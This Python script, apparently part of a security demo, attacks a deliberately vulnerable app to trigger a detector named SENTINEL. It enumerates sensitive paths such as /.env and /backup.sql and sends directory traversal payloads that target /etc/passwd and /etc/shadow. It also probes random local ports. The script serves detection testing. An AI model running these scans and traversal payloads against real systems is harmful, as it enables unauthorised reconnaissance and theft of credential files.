"""Port scan attack against the demo app.

Sends rapid HTTP requests to multiple paths + port probes, triggering
the reconnaissance detector in SENTINEL.  Also exercises the directory
traversal path (../../etc/passwd) which is a real vulnerability in the
demo app.

Usage: python apps/vulnerable/attacks/scan.py [--target http://demo-app:5000]
"""

from __future__ import annotations

import argparse
import random
import time
from urllib import error, request

SCAN_PATHS = [
    "/",
    "/admin",
    "/admin/users.json",
    "/login",
    "/search",
    "/comments",
    "/api/items",
    "/debug",
    "/.env",
    "/wp-admin",
    "/phpmyadmin",
    "/config.php",
    "/robots.txt",
    "/.git/HEAD",
    "/server-status",
    "/actuator",
    "/console",
    "/env",
    "/metrics",
    "/backup.sql",
]

TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../etc/shadow",
    "../../../etc/passwd",
    "%2e%2e/%2e%2e/etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
]


def run(target: str, delay: float = 0.1, rounds: int = 2) -> int:
    target = target.rstrip("/")
    total = (len(SCAN_PATHS) + len(TRAVERSAL_PAYLOADS)) * rounds
    print(
        f"[scan] probing {target} — {len(SCAN_PATHS)} paths + "
        f"{len(TRAVERSAL_PAYLOADS)} traversals x{rounds} rounds ({total} requests)"
    )

    for round_idx in range(rounds):
        # Path enumeration
        for path in SCAN_PATHS:
            url = f"{target}{path}"
            try:
                resp = request.urlopen(request.Request(url), timeout=5)
                code = resp.getcode()
            except error.HTTPError as e:
                code = e.code
            except Exception:
                code = 0
            print(f"  round {round_idx + 1}  path={path:25s}  status={code}")
            time.sleep(delay)

        # Directory traversal
        for payload in TRAVERSAL_PAYLOADS:
            url = f"{target}/search?q={payload}"
            try:
                resp = request.urlopen(request.Request(url), timeout=5)
                code = resp.getcode()
                body = resp.read().decode(errors="replace")[:100]
            except error.HTTPError as e:
                code = e.code
                body = ""
            except Exception:
                code = 0
                body = ""
            leaked = "root:" in body or "password" in body.lower()
            print(
                f"  round {round_idx + 1}  traverse={payload:30s}  status={code}  leaked={leaked}"
            )
            time.sleep(delay)

        # Random port probes (generate connection-refused errors = real traffic)
        ports = random.sample(range(1000, 9999), min(15, 9999 - 1000))
        for port in ports:
            url = f"http://127.0.0.1:{port}/"
            try:
                request.urlopen(request.Request(url), timeout=1)
            except Exception:
                pass  # Connection refused — still generates traffic
            time.sleep(0.01)

    print(f"[scan] done: {total} requests + {rounds * 15} port probes")
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default="http://127.0.0.1:5000")
    parser.add_argument("--delay", type=float, default=0.1)
    parser.add_argument("--rounds", type=int, default=2)
    args = parser.parse_args()
    return run(args.target, delay=args.delay, rounds=args.rounds)


if __name__ == "__main__":
    raise SystemExit(main())
